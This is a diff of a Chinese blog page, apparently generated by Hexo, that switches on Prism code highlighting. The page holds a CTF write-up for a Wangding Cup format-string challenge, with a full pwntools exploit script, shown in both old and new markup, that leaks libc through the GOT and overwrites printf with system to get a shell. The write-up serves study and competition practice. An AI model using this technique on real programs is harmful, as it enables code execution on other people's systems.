@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="网鼎杯 第二场 fmt​    学弟扔了网鼎杯的一道pwn给我，看了下发现是格式化字符串，恰巧昨天刚刚做了一道stack_check_fail劫持的格式化字符串题，今天又做格式化可以说还是比较轻松的。​">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -316,9 +316,38 @@
     
     <div class="post-body" itemprop="articleBody">
         <h2 id="网鼎杯-第二场-fmt"><a href="#网鼎杯-第二场-fmt" class="headerlink" title="网鼎杯 第二场 fmt"></a>网鼎杯 第二场 fmt</h2><p>​    学弟扔了网鼎杯的一道pwn给我，看了下发现是格式化字符串，恰巧昨天刚刚做了一道stack_check_fail劫持的格式化字符串题，今天又做格式化可以说还是比较轻松的。<br>​    <a id="more"></a><br>拿到题目一看发现是个中规中矩的格式化题目，有循环，供用户输入的缓冲区范围也比较大，漏洞就是直接printf字符串变量。<br>​    大致看了一下，先找到利用思路，可以通过泄露got表地址找到libc库，然后重新执行程序，第一次输入泄露libc函数地址，计算libc载入基地址，之后直接在栈上构造数据覆写printf的got表为system，因为参数保存在栈上，直接输入/bin/sh就能getshell了。<br>​    说轻松是很轻松，但那是整个解题思路，实际上在写脚本和调试的时候还是遇到不少坑的，比如说hhn和hn以及n的职能一开始没有分清导致调试的时候遇到不少坑，这里hhn是往目标地址写入一个字节，hn是两个，n是四字节，lln是八字节，可以按情况对数据进行字节拆分后写入目标地址空间。了解了以后做就很简单了。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process('./pwn')</span><br><span class="line">gdb.attach(p,<span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">	break *0x080485BB</span></span><br><span class="line"><span class="string">	break *0x080485ca</span></span><br><span class="line"><span class="string">	continue</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span>)</span><br><span class="line"><span class="attribute">elf</span>=ELF('./pwn')</span><br><span class="line"><span class="attribute">libc</span>=ELF('./libc.so.6')</span><br><span class="line">p.recvuntil(<span class="string">'Do you know repeater?\n'</span>)</span><br><span class="line">p.sendline(p32(elf.got[<span class="string">'read'</span>]))</span><br><span class="line">p.sendline(<span class="string">'%6$s'</span>)</span><br><span class="line"><span class="attribute">read_address</span>=int((p.recv(12)[5:9][::-1]).encode(<span class="string">'hex'</span>),16)</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'read_address &gt; '</span>+hex(read_address))</span><br><span class="line"><span class="attribute">libc_base</span>=read_address-libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'libc_base &gt; '</span>+hex(libc_base))</span><br><span class="line"><span class="attribute">system_address</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'system &gt; '</span>+hex(system_address))</span><br><span class="line"><span class="attribute">payload</span>=p32(elf.got[<span class="string">'printf'</span>])+p32(elf.got[<span class="string">'printf'</span>]+2)</span><br><span class="line">len1=(system_address &amp; 0xffff)</span><br><span class="line">len2=((system_address &gt;&gt; 16) &amp;0xff)</span><br><span class="line"><span class="comment">#len3=(system_address&gt;&gt;16)&amp;0xff</span></span><br><span class="line"><span class="comment">#print hex(len2)+' is len2'</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str(len1-8) + <span class="string">'x%6$hn'</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str(len2) + <span class="string">'x%7$hhn'</span></span><br><span class="line"><span class="comment">#payload+='%'+str(len3) + 'x%8$hn'</span></span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line"><span class="comment">#p.sendline('%01x%6$hhn'+'%1x%7$hhn'+'%2x%8$hhn')</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+<pre><code>from pwn import *
+p=process(&#39;./pwn&#39;)
+gdb.attach(p,&#39;&#39;&#39;
+    break *0x080485BB
+    break *0x080485ca
+    continue
+&#39;&#39;&#39;)
+elf=ELF(&#39;./pwn&#39;)
+libc=ELF(&#39;./libc.so.6&#39;)
+p.recvuntil(&#39;Do you know repeater?\n&#39;)
+p.sendline(p32(elf.got[&#39;read&#39;]))
+p.sendline(&#39;%6$s&#39;)
+read_address=int((p.recv(12)[5:9][::-1]).encode(&#39;hex&#39;),16)
+log.info(&#39;read_address &gt; &#39;+hex(read_address))
+libc_base=read_address-libc.symbols[&#39;read&#39;]
+log.info(&#39;libc_base &gt; &#39;+hex(libc_base))
+system_address=libc_base+libc.symbols[&#39;system&#39;]
+log.info(&#39;system &gt; &#39;+hex(system_address))
+payload=p32(elf.got[&#39;printf&#39;])+p32(elf.got[&#39;printf&#39;]+2)
+len1=(system_address &amp; 0xffff)
+len2=((system_address &gt;&gt; 16) &amp;0xff)
+#len3=(system_address&gt;&gt;16)&amp;0xff
+#print hex(len2)+&#39; is len2&#39;
+payload+=&#39;%&#39;+str(len1-8) + &#39;x%6$hn&#39;
+payload+=&#39;%&#39;+str(len2) + &#39;x%7$hhn&#39;
+#payload+=&#39;%&#39;+str(len3) + &#39;x%8$hn&#39;
+#print payload
+#p.sendline(&#39;%01x%6$hhn&#39;+&#39;%1x%7$hhn&#39;+&#39;%2x%8$hhn&#39;)
+p.send(payload)
+p.sendline(&#39;/bin/sh&#39;)
+p.interactive()
+</code></pre>
     </div>
 
     
@@ -423,6 +452,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
